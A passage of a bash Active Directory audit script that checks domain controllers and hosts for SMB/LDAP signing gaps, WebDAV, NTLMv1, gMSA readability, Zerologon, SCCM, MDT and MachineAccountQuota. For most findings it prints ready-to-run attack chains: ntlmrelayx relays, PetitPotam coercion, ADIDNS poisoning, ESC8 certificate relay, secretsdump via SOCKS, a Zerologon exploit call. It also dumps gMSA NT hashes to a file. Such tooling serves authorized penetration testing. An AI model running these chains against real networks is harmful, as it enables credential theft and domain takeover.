    echo -e "${RED}       └─ ADIDNS Poisoning + NTLM Relay might be possible${NC}"
    echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
    echo -e "${GREY}          2) dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<existing-fileshare-server>' -a add -d <YOUR_IP> $DC_IP${NC}"
    echo -e "${GREY}          3) Wait for auth to \\\\<hostname>\\share → relay to non-DC target${NC}"
  else
    echo -e "${GREY}       └─ dnstool.py -u '$DOMAIN\\$AD_USER' -p '$PASSWORD' -r '<hostname>.<DOMAIN>' -a add -d <YOUR_IP> $DC_IP${NC}"
  fi
else
  echo -e "${GREEN}[OK] ADIDNS zone write access is restricted${NC}"
fi

# WebDAV detection
WEBCLIENT_HOSTS=$(nxc smb $SCAN_TARGETS_STR -u "$AD_USER" -p "$PASSWORD" -M webdav 2>/dev/null | grep "WebClient Service" | grep -v "NOT" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u)
WEBCLIENT_COUNT=$(echo "$WEBCLIENT_HOSTS" | grep -v "^$" | wc -l)
if [ "$WEBCLIENT_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $WEBCLIENT_COUNT host(s) with WebClient (WebDAV) running → HTTP coercion possible (SMB signing bypass)${NC}"
  echo "$WEBCLIENT_HOSTS" | while read -r host; do
    echo -e "${RED}       └─ $host${NC}"
    echo -e "${GREY}          1) ntlmrelayx.py -t ldap://$DC_IP --delegate-access --no-smb-server --http-port 80${NC}"
    echo -e "${GREY}          2) responder -I <IF> --lm (or printerbug via HTTP: //$host@<RELAY>/x)${NC}"
  done
  if [ "$ESC8_VULN" -eq 1 ]; then
  echo -e "${RED}       └─ WebClient hosts present — HTTP coercion → ESC8 chain viable${NC}"
  echo "$WEBCLIENT_HOSTS" | while read -r wc_host; do
    echo -e "${GREY}          $wc_host → relay to http://$ESC8_CA_IP/certsrv/${NC}"
    echo -e "${GREY}          certipy-ad relay -target https://$ESC8_CA_IP/certsrv/certfnsh.asp -ca ${ESC8_CA_HOST%%.*} -template $ESC8_FIRST_DC_TEMPLATE${NC}"
  done
fi
else
  echo -e "${GREEN}[OK] No hosts with WebClient (WebDAV) running${NC}"
fi

echo ""

# NTLMv1
NTLMV1_CHECK=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M ntlmv1 2>/dev/null)
if echo "$NTLMV1_CHECK" | grep -qi "ntlmv1 enabled\|lmcompatibility.*[012]"; then
  echo -e "${RED}[KO] NTLMv1 enabled on DC${NC}"
  echo -e "${GREY}       └─ Crack with https://ntlmv1.com (rainbow tables)${NC}"
else
  echo -e "${GREEN}[OK] NTLMv1 disabled${NC}"
fi

# SMBv1
SMBV1_HOSTS=$(nxc smb $SCAN_TARGETS_STR -u "$AD_USER" -p "$PASSWORD" -M smbv1 2>/dev/null | grep "SMBv1 enabled" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u)
SMBV1_COUNT=$(echo "$SMBV1_HOSTS" | grep -v "^$" | wc -l)
if [ "$SMBV1_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $SMBV1_COUNT host(s) with SMBv1 enabled${NC}"
  echo "$SMBV1_HOSTS" | while read -r host; do
    echo -e "${RED}       └─ $host${NC}"
  done
else
  echo -e "${GREEN}[OK] SMBv1 disabled on scanned hosts${NC}"
fi

# SMB Signing on DCs
if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
  VULN_SMB_DCS=""
  VULN_SMB_COUNT=0  
  while IFS=: read -r hostname ip; do
    smb_check=$(timeout 10 netexec smb $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1 | grep -oP 'signing:(True|False)')
    signing=$(echo "$smb_check" | grep -oP 'signing:\K\w+')
    
    if [ "$signing" != "True" ]; then
      VULN_SMB_COUNT=$((VULN_SMB_COUNT + 1))
      VULN_SMB_DCS="${VULN_SMB_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
    fi
  done < "$OUTPUT_DIR/all_dcs.txt"  
  if [ $VULN_SMB_COUNT -gt 0 ]; then
    if [ $VULN_SMB_COUNT -eq $DC_COUNT ]; then
      echo -e "${RED}[KO] All $DC_COUNT DCs: SMB Signing NOT required${NC}"
    else
      echo -e "${RED}[KO] $VULN_SMB_COUNT/$DC_COUNT DC(s) without required SMB Signing${NC}"
    fi
    printf "$VULN_SMB_DCS"
    
    # Extract first vulnerable DC IP
    FIRST_VULN_SMB_DC_IP=$(echo -e "$VULN_SMB_DCS" | head -1 | grep -oP '\d+\.\d+\.\d+\.\d+')
    if [ "$RELAY_COUNT" -gt 0 ]; then
      echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
      echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_SMB_DC_IP}${NC}"
    else
      echo -e "${GREEN}       └─ Not directly exploitable: No non-DC relay targets${NC}"
    fi
    echo -e "${GREY}       └─ Passive SOCKS relay: Coerce users to DC${NC}"
    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${FIRST_VULN_SMB_DC_IP} -smb2support -socks${NC}"
    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> <NON_DC_HOST>${NC}"
    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/<HOST>\$@${FIRST_VULN_SMB_DC_IP}'${NC}"
    echo -e "${GREY}          4) Privileged users could dump: proxychains4 impacket-secretsdump -no-pass '${DOMAIN}/<USER>@${FIRST_VULN_SMB_DC_IP}'${NC}"
  else
    echo -e "${GREEN}[OK] SMB Signing required on all DCs${NC}"
  fi
else
  # Fallback: single DC check
  SMB_DC_CHECK=$(netexec smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
  if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
    echo -e "${GREEN}[OK] SMB Signing required on DC${NC}"
  else
    echo -e "${RED}[KO] SMB Signing NOT required on DC${NC}"
    if [ "$RELAY_COUNT" -gt 0 ]; then
      echo -e "${RED}       └─ Exploitable: Coerce DC to non-DC relay targets${NC}"
      echo -e "${GREY}          1) ntlmrelayx.py -tf '$OUTPUT_DIR/relay_targets.txt' -smb2support${NC}"
      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
    else
      echo -e "${GREEN}       └─ Not exploitable via relay: No targets without SMB Signing found${NC}"
    fi
    
    # SOCKS access - coerce any other host to DC
    echo -e "${GREY}       └─ Additionally: SOCKS Relay for share enumeration${NC}"
    echo -e "${GREY}          1) ntlmrelayx.py -t smb://${DC_IP} -smb2support -socks${NC}"
    echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> <ANY_OTHER_HOST>${NC}"
    echo -e "${GREY}          3) proxychains4 impacket-smbclient -no-pass '${DOMAIN}/ADMINISTRATOR\$@${DC_IP}'${NC}"
  fi
fi

# SMB Signing
if [ "$RELAY_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $RELAY_COUNT non-DC host(s) without SMB Signing → relay_targets.txt${NC}"
else
  echo -e "${GREEN}[OK] SMB Signing enabled on all non-DC host(s)${NC}"
  rm -f "$OUTPUT_DIR/relay_targets.txt"
fi

# LDAP Signing & LDAPS Channel Binding
if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
  echo "DC,IP,LDAP_Signing,Channel_Binding" > "$OUTPUT_DIR/ldap_security_check.csv"
  VULN_DCS=""
  VULN_COUNT=0
  while IFS=: read -r hostname ip; do
    result=$(timeout 10 netexec ldap $ip -u "$AD_USER" -p "$PASSWORD" --timeout 5 2>&1)
    signing=$(echo "$result" | grep -oP 'signing:\K\w+')
    cb=$(echo "$result" | grep -oP 'channel binding:\K\S+')
    if [ -z "$signing" ]; then
      echo "$hostname,$ip,TIMEOUT,TIMEOUT" >> "$OUTPUT_DIR/ldap_security_check.csv"
    else
      echo "$hostname,$ip,$signing,$cb" >> "$OUTPUT_DIR/ldap_security_check.csv"
      if [ "$signing" = "None" ] && [[ "$cb" =~ ^(No|Never) ]]; then
        VULN_COUNT=$((VULN_COUNT + 1))
        VULN_DCS="${VULN_DCS}${RED}       └─ ${hostname} (${ip})${NC}\n"
      fi
    fi
  done < "$OUTPUT_DIR/all_dcs.txt"
  if [ $VULN_COUNT -gt 0 ]; then
    LDAP_SIGNING_VULN=1 
    if [ $VULN_COUNT -eq $DC_COUNT ]; then
      echo -e "${RED}[KO] All $DC_COUNT DCs: LDAP Signing + LDAPS Channel Binding NOT enforced → ldap_security_check.csv${NC}"
    else
      echo -e "${RED}[KO] $VULN_COUNT/$DC_COUNT DC(s) without LDAP Signing + LDAPS Channel Binding → ldap_security_check.csv${NC}"
      printf "$VULN_DCS"
    fi
    FIRST_VULN_LDAP_DC_IP=$(awk -F',' 'NR==2 {print $2}' "$OUTPUT_DIR/ldap_security_check.csv")
    if [ "$RELAY_COUNT" -gt 0 ]; then
      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
      echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
    elif [ "$WEBCLIENT_COUNT" -gt 0 ]; then
      echo -e "${RED}       └─ Exploitable via WebClient → LDAP Relay${NC}"
      echo -e "${GREY}          1) ntlmrelayx.py -t ldap://$DC_IP --delegate-access --no-smb-server --http-port 80${NC}"
      echo -e "${GREY}          2) responder -I <IF> + printerbug via http://<WEBCLIENT_HOST>@<RELAY>/x${NC}"
    else
      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
    fi
  else
    echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding on all DCs enforced${NC}"
    LDAP_SIGNING_VULN=0 
  fi
else
  LDAP_CHECK=$(netexec ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
  LDAP_SIGNING=$(echo "$LDAP_CHECK" | grep -oP 'signing:\K\w+')
  LDAP_CB=$(echo "$LDAP_CHECK" | grep -oP 'channel binding:\K\S+')
  if [ "$LDAP_SIGNING" = "None" ] && [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
    echo -e "${RED}[KO] LDAP Signing + LDAPS Channel Binding NOT enforced${NC}"
    LDAP_SIGNING_VULN=1
    if [ "$RELAY_COUNT" -gt 0 ]; then
      echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${DC_IP} --remove-mic --delegate-access${NC}"
      echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${DC_IP}${NC}"
      echo -e "${GREY}          3) getST.py -spn cifs/${DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
    else
      echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
    fi
  elif [ "$LDAP_SIGNING" = "None" ]; then
    echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
    echo -e "${GREEN}       └─ Not Exploitable: LDAPS Channel Binding enabled${NC}"
    LDAP_SIGNING_VULN=0 
  elif [[ "$LDAP_CB" =~ ^(No|Never) ]]; then
    echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
    echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
    LDAP_SIGNING_VULN=0 
  else
    echo -e "${GREEN}[OK] LDAP Signing + LDAPS Channel Binding enforced${NC}"
    LDAP_SIGNING_VULN=0 
  fi
fi

# LDAP Anonymous Bind
ANON_BIND=$(ldapsearch -x -H ldap://$DC_IP -b "$DOMAIN_DN" "(objectClass=domain)" dn 2>/dev/null | grep -c "^dn:")
DS_HEURISTICS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$DOMAIN_DN" \
  "(objectClass=*)" dsHeuristics 2>/dev/null | grep "^dsHeuristics:" | awk '{print $2}')
if [ "$ANON_BIND" -gt 0 ]; then
  echo -e "${RED}[KO] LDAP anonymous bind successful — unauthenticated enumeration possible${NC}"
  echo -e "${GREY}       └─ ldapsearch -x -H ldap://$DC_IP -b '$DOMAIN_DN' '(objectClass=user)'${NC}"
elif [ ! -z "$DS_HEURISTICS" ] && [ "${DS_HEURISTICS:6:1}" = "2" ]; then
  echo -e "${RED}[KO] dsHeuristics indicates anonymous access enabled (char 7 = 2)${NC}"
else
  echo -e "${GREEN}[OK] LDAP anonymous bind disabled${NC}"
fi

# Plain LDAP without TLS enforcement
PLAIN_LDAP=$(ldapsearch -x -H ldap://$DC_IP -b "" -s base supportedCapabilities 2>/dev/null | grep -c "dn:")
if [ "$PLAIN_LDAP" -gt 0 ]; then
  echo -e "${RED}[KO] LDAP port 389 is accessible, intercepted traffic may be unencrypted${NC}"
  echo -e "${GREY}       └─ tcpdump -i eth0 -w ldap_capture.pcap port 389${NC}"
  echo -e "${GREY}       └─ tshark -r ldap_capture.pcap -Y 'ldap' -T text${NC}"
else
  echo -e "${GREEN}[OK] LDAP not accessible without TLS${NC}"
fi


echo ""

# Create domain_users.txt
ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" '(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName 2>/dev/null | grep '^sAMAccountName:' | awk '{print $2}' > "$OUTPUT_DIR/domain_users.txt"
if [ -s "$OUTPUT_DIR/domain_users.txt" ]; then
  USER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_users.txt" 2>/dev/null)
  echo -e "${GREEN}[OK] Enumerated $USER_COUNT active users → domain_users.txt${NC}"
else
  echo -e "${GREY}[??] Failed to enumerate users${NC}"
fi

# Enumerate users with descriptions
DESC_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" -M get-desc-users 2>/dev/null)

if echo "$DESC_OUTPUT" | grep -q "User:"; then
  # Extract just the user:description lines and save to file
  echo "$DESC_OUTPUT" | grep "User:" | sed 's/.*User: //' > "$OUTPUT_DIR/user_descriptions.txt"
  DESC_COUNT=$(wc -l < "$OUTPUT_DIR/user_descriptions.txt" 2>/dev/null)
  echo -e "${GREEN}[OK] $DESC_COUNT user(s) with descriptions → user_descriptions.txt${NC}"
else
  echo -e "${GREEN}[OK] No users with descriptions found${NC}"
fi

# Create domain_computers.txt with OS info
ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" \
  sAMAccountName operatingSystem operatingSystemVersion 2>/dev/null | \
  awk '
    /^sAMAccountName:/ { name=$2 }
    /^operatingSystem:/ { 
      os=$0; 
      sub(/^operatingSystem: /, "", os)
    }
    /^operatingSystemVersion:/ { 
      ver=$0; 
      sub(/^operatingSystemVersion: /, "", ver)
    }
    /^$/ { 
      if (name != "") {
        if (os != "") {
          printf "%s - %s", name, os
          if (ver != "") printf " (%s)", ver
          printf "\n"
        } else {
          print name " - Unknown OS"
        }
        name=""; os=""; ver=""
      }
    }
  ' | sort > "$OUTPUT_DIR/domain_computers.txt"

if [ -f "$OUTPUT_DIR/domain_computers.txt" ] && [ -s "$OUTPUT_DIR/domain_computers.txt" ]; then
  COMPUTER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_computers.txt")
  echo -e "${GREEN}[OK] Enumerated $COMPUTER_COUNT computer account(s) → domain_computers.txt${NC}"
else
  echo -e "${GREY}[--] Failed to enumerate computers${NC}"
fi

# DNS Zone Transfer (AXFR)
AXFR_OUTPUT=$(dig axfr "$DOMAIN" @$DC_IP 2>/dev/null)
if echo "$AXFR_OUTPUT" | grep -q "Transfer failed\|connection refused\|REFUSED\|timed out"; then
  echo -e "${GREEN}[OK] Unauthenticated DNS Zone Transfer (AXFR) enumeration blocked${NC}"
elif echo "$AXFR_OUTPUT" | grep -qE "^$DOMAIN\." ; then
  RECORD_COUNT=$(echo "$AXFR_OUTPUT" | grep -cE "^$DOMAIN\.|IN\s+(A|AAAA|CNAME|MX|SRV)")
  echo -e "${RED}[KO] Unauthenticated DNS Zone Transfer (AXFR) enumeration possible — $RECORD_COUNT record(s) exposed → axfr.txt${NC}"
  echo "$AXFR_OUTPUT" > "$OUTPUT_DIR/axfr.txt"
else
  echo -e "${GREY}[--] Unauthenticated DNS Zone Transfer (AXFR) result inconclusive${NC}"
fi

# gMSA readable
GMSA_OUTPUT=$(nxc ldap $DC_IP -u "$AD_USER" -p "$PASSWORD" --gmsa 2>/dev/null)
if echo "$GMSA_OUTPUT" | grep -q "Account:"; then
  GMSA_TOTAL=$(echo "$GMSA_OUTPUT" | grep -c "Account:")
  GMSA_READABLE=$(echo "$GMSA_OUTPUT" | grep "Account:" | grep -v "no read permissions" | wc -l)
  if [ "$GMSA_READABLE" -gt 0 ]; then
    echo -e "${RED}[KO] $GMSA_TOTAL gMSA account(s) found — $GMSA_READABLE readable → gmsa_readable.txt${NC}"
    echo "$GMSA_OUTPUT" | grep "Account:" | grep -v "no read permissions" | while read -r line; do
      GMSA_NAME=$(echo "$line" | grep -oP 'Account: \K\S+')
      GMSA_HASH=$(echo "$line" | grep -oP 'NTLM: \K.*?(?=\s{2,})')
      echo -e "${RED}       └─ $GMSA_NAME (NT: $GMSA_HASH)${NC}"
    done
  else
    echo -e "${GREEN}[OK] $GMSA_TOTAL gMSA account(s) not readable by user → gmsa_readable.txt${NC}"
  fi
  echo "$GMSA_OUTPUT" | grep "Account:" | while read -r line; do
    GMSA_NAME=$(echo "$line" | grep -oP 'Account: \K\S+')
    GMSA_HASH=$(echo "$line" | grep -oP 'NTLM: \K.*?(?=\s{2,})')
    GMSA_PRINCIPALS=$(echo "$line" | grep -oP 'PrincipalsAllowedToReadPassword: \K.*')
    [ -z "$GMSA_HASH" ] && GMSA_HASH="not readable"
    echo "$GMSA_NAME | NT: $GMSA_HASH | Allowed: $GMSA_PRINCIPALS"
  done > "$OUTPUT_DIR/gmsa_readable.txt"
else
  echo -e "${GREEN}[OK] No gMSA accounts found${NC}"
fi

# BloodHound
if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
  BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
  cd "$OUTPUT_DIR/bloodhound"
  $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
  
  # Fallback with DNS TCP if no JSONs produced
  if [ "$BH_JSON" -eq 0 ]; then
    $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE --dns-timeout 30 --dns-tcp &>/dev/null
  fi
  cd "$CURRENT_PATH"
  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
  
  # Check for BloodHound JSONs
  if [ "$BH_JSON" -gt 0 ]; then
    echo "$AD_USER:password:$PASSWORD" > "$OUTPUT_DIR/bloodhound/owned"
    echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"

  # Run GriffonAD (already installed at start)
  if [ -f "$GRIFFON_PATH/griffon.py" ]; then
    cd "$OUTPUT_DIR/bloodhound"
    JSON_FILES=( *.json )
    if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
      GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo $(ls *.json | grep -v Certipy) 2>&1)
      GRIFFON_EXIT=$?
      
      if [ $GRIFFON_EXIT -ne 0 ]; then
        echo -e "${GREY}[--] GriffonAD failed → griffon_error.txt${NC}"
        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_error.txt"
      elif echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
        echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
      elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
        PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
        echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
        echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
          TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
          echo -e "${RED}       └─ $TARGET${NC}"
        done
        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
      else
        echo -e "${GREY}[--] GriffonAD no results → griffon_debug.txt${NC}"
        echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
      fi
    fi
    cd "$CURRENT_PATH"
  else
    echo -e "${GREY}[--] GriffonAD not found${NC}"
  fi
  else
    echo -e "${GREY}[--] BloodHound export failed${NC}"
  fi
else
  echo -e "${GREY}[--] Bloodhound-python not found, skipping collection${NC}"
fi

# Bloodhound Info (ZIP for BloodHound CE)
CONTAINER_NAME=$(hostname)
cd "$CURRENT_PATH"

echo ""

# Zerologon (CVE-2020-1472)
if [ ! -z "$DC_BUILD" ] && [ "$DC_BUILD" -ge 17763 ]; then
  echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable (Build $DC_BUILD ≥ 17763)${NC}"
else
  ZERO_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -M zerologon 2>/dev/null)
  if echo "$ZERO_OUTPUT" | grep -q "VULNERABLE"; then
    echo -e "${RED}[KO] Zerologon (CVE-2020-1472) vulnerable${NC}"
    echo -e "${GREY}       └─ /opt/tools/zerologon/venv/bin/python3 /opt/tools/zerologon/zerologon-exploit/cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP${NC}"
  elif echo "$ZERO_OUTPUT" | grep -q "Attack failed"; then
    echo -e "${GREEN}[OK] Zerologon (CVE-2020-1472) not vulnerable${NC}"
  else
    echo -e "${GREY}[--] Zerologon check inconclusive${NC}"
  fi
fi

# MDT Detection
MDT_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectclass=intellimirrorSCP)" cn netbootServer 2>/dev/null)
MDT_COUNT=$(echo "$MDT_OUTPUT" | grep -c "^cn:")
if [ "$MDT_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] MDT detected ($MDT_COUNT instance(s))${NC}"
  while IFS= read -r line; do
    CN=$(echo "$line" | awk '{print $2}')
    NETBOOT=$(echo "$MDT_OUTPUT" | grep -A 20 "cn: $CN" | grep "^netbootServer:" | awk '{print $2}' | head -1)

    if [ ! -z "$NETBOOT" ]; then
      MDT_HOST_FQDN=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(distinguishedName=$NETBOOT)" dNSHostName 2>/dev/null | grep "^dNSHostName:" | awk '{print $2}' | head -1)
      [ -z "$MDT_HOST_FQDN" ] && MDT_HOST_FQDN="UNKNOWN"
    else
      MDT_HOST_FQDN="UNKNOWN"
    fi
    echo -e "${RED}       └─ $CN on $MDT_HOST_FQDN${NC}"
    echo -e "${GREY}          └─ Check credentials in DeploymentShare:${NC}"
    echo -e "${GREY}             smbclient //$MDT_HOST_FQDN/DeploymentShare\$ -U '$FULL_USER%$PASSWORD'${NC}"
    echo -e "${GREY}             → Bootstrap.ini / CustomSettings.ini (cleartext creds)${NC}"
  done < <(echo "$MDT_OUTPUT" | grep "^cn:")
else
  echo -e "${GREEN}[OK] No MDT infrastructure detected${NC}"
fi

# SCCMHunter
if command -v sccmhunter.py &>/dev/null || [ -f "/opt/tools/sccmhunter/sccmhunter.py" ]; then
  if command -v sccmhunter.py &>/dev/null; then
    SCCM_CMD="sccmhunter.py"
  else
    SCCM_CMD="/opt/tools/sccmhunter/venv/bin/python3 /opt/tools/sccmhunter/sccmhunter.py"
  fi
  SCCM_FIND=$($SCCM_CMD find -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc-ip $DC_IP 2>&1)
  if echo "$SCCM_FIND" | grep -q "ModuleNotFoundError\|ImportError\|No module named"; then
    echo -e "${GREY}[--] SCCMHunter dependencies missing — SCCM check skipped${NC}"
  elif echo "$SCCM_FIND" | grep -q "System Management Container not found\|No results found"; then
    echo -e "${GREEN}[OK] No SCCM/MECM infrastructure detected${NC}"
  else
    echo "$SCCM_FIND" > "$OUTPUT_DIR/sccmhunter_find.txt"
    echo -e "${RED}[KO] SCCM/MECM infrastructure detected → sccmhunter_find.txt${NC}"
    $SCCM_CMD show -all 2>&1 > "$OUTPUT_DIR/sccmhunter_show.txt"
    NAA_COUNT=$(grep -ci "naa\|network access" "$OUTPUT_DIR/sccmhunter_show.txt" 2>/dev/null)
    NAA_COUNT=${NAA_COUNT:-0}
    if [ "$NAA_COUNT" -gt 0 ]; then
      echo -e "${RED}       └─ NAA credentials may be present → sccmhunter_show.txt${NC}"
    fi
    echo -e "${GREY}       └─ sccmhunter.py http -u '$AD_USER' -p '$PASSWORD' -d '$DOMAIN' -dc-ip $DC_IP${NC}"
    echo -e "${GREY}          SharpSCCM.exe local secrets -m disk${NC}"
  fi
else
  echo -e "${GREY}[--] SCCMHunter not found — SCCM check skipped${NC}"
fi

# dMSA / BadSuccessor Check
DMSA_COUNT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=msDS-DelegatedManagedServiceAccount)" sAMAccountName 2>/dev/null | grep -c "^sAMAccountName:")
DFL=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=domain)" msDS-Behavior-Version 2>/dev/null | grep "^msDS-Behavior-Version:" | awk '{print $2}')
if [ "$DMSA_COUNT" -gt 0 ] && [ "$DFL" -ge 10 ] 2>/dev/null; then
  echo -e "${RED}[KO] $DMSA_COUNT dMSA object(s) found — BadSuccessor attack surface (DFL: $DFL)${NC}"
  ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(objectClass=msDS-DelegatedManagedServiceAccount)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
elif [ "$DMSA_COUNT" -gt 0 ]; then
  echo -e "${GREY}[--] $DMSA_COUNT dMSA object(s) found but DFL $DFL < 10 (BadSuccessor not applicable)${NC}"
else
  echo -e "${GREEN}[OK] No dMSA objects found (DFL: $DFL)${NC}"
fi

echo ""

# Pre-created Computer Accounts Check
PRECREATED_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=2048))" sAMAccountName dNSHostName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
PRECREATED_COUNT=$(echo "$PRECREATED_OUTPUT" | grep -v "^$" | wc -l)
if [ "$PRECREATED_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $PRECREATED_COUNT pre-created computer account(s) found${NC}"
  echo "$PRECREATED_OUTPUT" | while read -r computer; do
    [ -z "$computer" ] && continue
    SHORTNAME=$(echo "${computer%\$}" | tr '[:upper:]' '[:lower:]')
    echo -e "${RED}       └─ $computer${NC}"
    echo -e "${GREY}          └─ Default password: $SHORTNAME${NC}"
    echo -e "${GREY}             nxc smb $DC_IP -u '$computer' -p '$SHORTNAME' -d '$DOMAIN'${NC}"
  done
else
  echo -e "${GREEN}[OK] No pre-created computer accounts found${NC}"
fi

# MachineAccountQuota Check
MAQ=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota 2>/dev/null | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')

if [ ! -z "$MAQ" ]; then
  if [ "$MAQ" -gt 0 ]; then
    echo -e "${RED}[KO] MachineAccountQuota: $MAQ (Users can create computer objects)${NC}"
    echo -e "${GREY}       └─ addcomputer.py -computer-name 'AAAAAAA\$' -computer-pass 'Ilovefkad1337?' '$DOMAIN/$AD_USER:$PASSWORD' -dc-ip $DC_IP${NC}"
    
    # MITM6 + NTLM + MAQ Relay
    if [ "$IPV6_VULN" = "1" ] && [ "$LDAP_SIGNING_VULN" = "1" ]; then
      echo -e "${RED}       └─ MITM6 + NTLM Relay → DA Path possible${NC}"
      echo -e "${GREY}          1) mitm6 -d $DOMAIN${NC}"
